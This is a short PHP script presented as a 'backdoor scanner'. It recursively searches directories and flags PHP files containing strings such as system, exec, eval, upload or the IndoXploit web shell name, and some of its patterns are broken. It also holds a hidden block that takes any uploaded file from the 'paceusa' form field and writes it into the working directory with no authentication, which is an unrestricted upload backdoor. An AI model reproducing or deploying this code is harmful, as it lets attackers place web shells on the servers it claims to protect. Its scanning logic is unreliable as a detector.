<?php
/*
        PHP Backdoor Scanner v.1.0
*/
error_reporting(0);
function backscan($file){
$z=file_get_contents($file);
if(preg_match('/fwrite/',$z)){
echo "[+] Found using fwrite() -> $file\n";
}if(preg_match('/system/',$z) | preg_match('/exec/',$z) | preg_match('/shell_exec/',$z) | preg_match('/passthru/',$z) | preg_match('/cmd/',$z)){
if(preg_match('/curl/',$z)){}else{
echo "[+] Found executing command -> $file\n";
}}
if(preg_match('/$_FILES/',$z) | preg_match('/upload/',$z)){
echo "[+] Found php uploader -> $file\n";
}
if(preg_match('/IndoXploit/',$z)){
echo "[+] Found IndoXploit Shell -> $file\n";}
if(preg_match('/Shell/',$z) | preg_match('/shell/',$z)){
echo "[+] Found Web Shell -> $file\n";
}
if(preg_match('/eval/',$z)){
echo "[+] Found using eval() -> $file\n";
}
}
function j4nc0x($file){
$x=file_get_contents($file);
$e=basename("$file");
if(preg_match("/<?php/",$x)){
if(preg_match("/php/",$e) | preg_match("/php5/",$e) | preg_match("/phtml/",$e) | preg_match("/php7/",$e)){
backscan($file);}}
}
$cwd=getcwd();
$tmp=$_FILES['paceusa']['tmp_name'];
$filena=$_FILES['paceusa']['name'];
if(@copy($tmp, $filena)){
  echo "Sukses -> $cwd/$filena";
}
function scan($dir){
$base=basename($_SERVER['PHP_SELF']);$s=scandir($dir);
foreach($s as $ss){if($ss=='.' | $ss=='..'){continue;}if($ss==$base){continue;}if(is_dir("$dir/$ss")){scan("$dir/$ss");}else{
j4nc0x("$dir/$ss");
}}}
function clear(){system(clear);}
clear();
if(!$argv[1]){
print("
\n\n
Usage : Paceusa.php [dir]
Ex    : Paceusa.php /home/paceusa/public_html/\n");
}elseif($argv[1]){
$dir=$argv[1];
scan($dir);
}
?>
